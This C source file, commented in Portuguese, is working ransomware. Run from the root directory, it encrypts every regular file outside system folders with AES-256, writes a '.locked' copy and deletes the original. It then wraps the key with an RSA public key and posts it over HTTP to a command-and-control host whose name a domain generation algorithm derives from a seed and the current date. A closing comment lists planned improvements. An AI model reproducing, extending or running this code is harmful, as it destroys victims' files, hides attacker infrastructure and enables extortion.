#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>  //pra algoritmos e criptografia
#include <openssl/rand.h> //random num para criptografia
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <sys/stat.h>

#define KEY_SIZE 32
#define BLOCK_SIZE 16
#define PEM "publica.pem"
#define SEED "bm90bm90cGV0eWE="

void handle_errors()
{
    ERR_print_errors_fp(stderr);
    abort();
}

char *domainGenAl(const char *seed, int n)
{
    time_t t;
    t = time(NULL);
    struct tm *tm = localtime(&t);
    char date[100];

    int d = 0;

    // Gera data no formato DDMMYYYY
    d = (tm->tm_mday * 100 + tm->tm_mon + 1);
    d *= 10000;
    d += tm->tm_year + 1900;

    sprintf(date, "%d", d); // data com 8 caracteres

    unsigned char date_bytes[16];
    unsigned char seed_bytes[16];

    for (int i = 0; i < 16; i++)
    {
        seed_bytes[i] = (unsigned char)seed[i];
    }

    for (int i = 0; i < 8; i++)
    {
        date_bytes[i] = (unsigned char)date[i];
        date_bytes[i + 8] = (unsigned char)date[i]; // Repete segunda vez
    }

    // XOR
    unsigned char xor_result[16];
    for (int i = 0; i < 16; i++)
    {
        xor_result[i] = seed_bytes[i] ^ date_bytes[i];
    }

    // Normaliza
    // Usa n para limitar o tamanho do domínio
    char *domain = malloc(n + 1);
    if (!domain)
    {
        printf("Memory error\n");
        return NULL;
    }

    const char *charset = "abcdefghijklmnopqrstuvwxyz0123456789-";
    int charset_len = strlen(charset);

    for (int i = 0; i < n; i++)
    {
        // índice válido
        int idx = xor_result[i % 16] % charset_len;
        domain[i] = charset[idx];
    }
    domain[n] = '\0';

    printf("Data: %s\n", date);
    printf("Domínio gerado: %s\n", domain);

    return domain;
}

void post(char *hex, char *iv, size_t n)
{
    CURL *curl;        // handle
    CURLcode response; // codigo de retorno da func curl_easy_perform()

    char json[500];

    curl = curl_easy_init();
    char *base_domain = domainGenAl(SEED, 16);
    char final_url[256];
    snprintf(final_url, sizeof(final_url), "http://%s.com:8080/", base_domain);

    if (curl && hex != NULL)
    {

        curl_easy_setopt(curl, CURLOPT_URL, final_url);                          // configura opções no handle
        snprintf(json, sizeof(json), "{\"hex\":\"%s\",\"iv\":\"%s\"}", hex, iv); // construção do json

        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers); // montagem do header

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json); // montagem do post
    }

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL); // func de callback pra escrever os dados da resposta(o null sig
    // nifica que ira escrever direto na func padrão(CURLOPT_WRITEDATA))
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout); // aqui dizemos que a func de resposta escrevera no terminal(stdout)

    response = curl_easy_perform(curl);

    if (response != CURLE_OK)
        fprintf(stderr, "Erro: %s\n", curl_easy_strerror(response));

    curl_easy_cleanup(curl);
    free(base_domain);
}

unsigned char *encAES(const char *filename, const unsigned char *msg, size_t *tam)
{
    FILE *input = fopen(filename, "r");

    if (!input)
    {
        perror("Impossible to open archive with pub rsa");
        return NULL;
    }

    EVP_PKEY *pubkey = PEM_read_PUBKEY(input, NULL, NULL, NULL);
    fclose(input);

    if (!pubkey)
        handle_errors();

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pubkey, NULL);
    if (!ctx)
        handle_errors();

    if (EVP_PKEY_encrypt_init(ctx) <= 0)
        handle_errors();

    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0)
        handle_errors();

    size_t outlen;
    if (EVP_PKEY_encrypt(ctx, NULL, &outlen, (unsigned char *)msg, strlen(msg)) <= 0)
        handle_errors();

    unsigned char *out = malloc(outlen);
    if (!out)
    {
        printf("Memory error\n");
        EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(pubkey);
        return NULL;
    }

    if (EVP_PKEY_encrypt(ctx, out, &outlen, (unsigned char *)msg, strlen(msg)) <= 0)
        handle_errors();

    printf("%zu bytes\n", outlen);

    //-------------------------
    for (int i = 0; i < outlen; i++)
        printf("%02x", out[i]);

    *tam = outlen;

    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(pubkey);

    return out;
}

void enF(const char *filename, const unsigned char *key, const unsigned char *iv) // cript file
{
    FILE *input = fopen(filename, "rb");
    if (!input)
    {
        perror("!!");
        return;
    }

    char encryptedFile[256];

    snprintf(encryptedFile, sizeof(encryptedFile), "%s.locked", filename); // pega o nome do arquivo e acrescenta um .locked

    FILE *output = fopen(encryptedFile, "wb"); // abre o arquivo com permissao de escrita(em binario)
    if (!output)
    {
        perror("!!");
        fclose(input);
        return;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();                // ponteiro pra esse struct(contem diversas op de crip e descrip) criamos o contexto pra criptografia
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv); // inicializa para criptografar

    unsigned char buffer[1024];
    unsigned char encrypted_buffer[1024 + BLOCK_SIZE];
    int bytes_read, encrypted_bytes;

    while ((bytes_read = fread(buffer, 1, sizeof(buffer), input)) > 0)
    {
        EVP_EncryptUpdate(ctx, encrypted_buffer, &encrypted_bytes, buffer, bytes_read); // criptografa
        fwrite(encrypted_buffer, 1, encrypted_bytes, output);
    }

    EVP_EncryptFinal_ex(ctx, encrypted_buffer, &encrypted_bytes); // finaliza cript
    fwrite(encrypted_buffer, 1, encrypted_bytes, output);

    EVP_CIPHER_CTX_free(ctx); // libera contexto
    fclose(input);
    fclose(output);

    remove(filename);
    printf("Encrypted file %s\n", encryptedFile);
}

void enDire(const char *directory, const unsigned char *key, const unsigned char *iv)
{
    DIR *dir = opendir(directory);
    struct stat st;
    char *repos[] = {"bin",
                     "sbin",
                     "boot",
                     "etc",
                     "lib",
                     "dev",
                     "proc",
                     "sys",
                     NULL};

    if (!dir)
    {
        return;
    }

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL)
    {
        // Ignora "." e ".."
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char filepath[1024];
        snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);

        struct stat st;
        if (stat(filepath, &st) == 0)
        {
            if (S_ISDIR(st.st_mode))
            {
                // Se for diretório, chama recursivamente
                int p = 0;
                for (int i = 0; repos[i] != NULL; i++)
                {
                    if (strcmp(entry->d_name, repos[i]) == 0)
                    {
                        p = 1;
                        break;
                    }
                }

                if (p)
                    continue;

                enDire(filepath, key, iv);
            }
            else if (S_ISREG(st.st_mode))
            {
                // Se for arquivo regular e não estiver criptografado
                if (strstr(entry->d_name, ".locked") == NULL)
                {
                    enF(filepath, key, iv);
                }
            }
        }
    }

    closedir(dir);
}

int main()
{
    chdir("/");

    unsigned char key[KEY_SIZE];
    unsigned char iv[BLOCK_SIZE]; // initialization vector(random)

    if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv)))
    {
        fprintf(stderr, "err generating iv or key");
        return 1;
    }

    printf("key AES: ");

    char hex_key[KEY_SIZE * 2 + 1] = {0};
    char hex_iv[BLOCK_SIZE * 2 + 1] = {0};

    for (int i = 0; i < KEY_SIZE; i++)
    {
        sprintf(&hex_key[i * 2], "%02x", key[i]);
    }
    printf("Hex string: %s\n", hex_key);

    for (int i = 0; i < BLOCK_SIZE; i++)
    {
        sprintf(&hex_iv[i * 2], "%02x", iv[i]);
    }
    char target_directory[1024];

    getcwd(target_directory, sizeof(target_directory));

    printf("%s", target_directory);
    enDire(target_directory, key, iv);

    size_t tam = 0;

    post(encAES(PEM, hex_key, &tam), hex_iv, tam);

    return 0;
}

// melhorias: exportar a chave de criptografia, fazer recurssão enquanto existir diretório,
// substituir o diretório atual pelo raiz
// ignorar arquivos de sistemas, desenvolver scrip tshell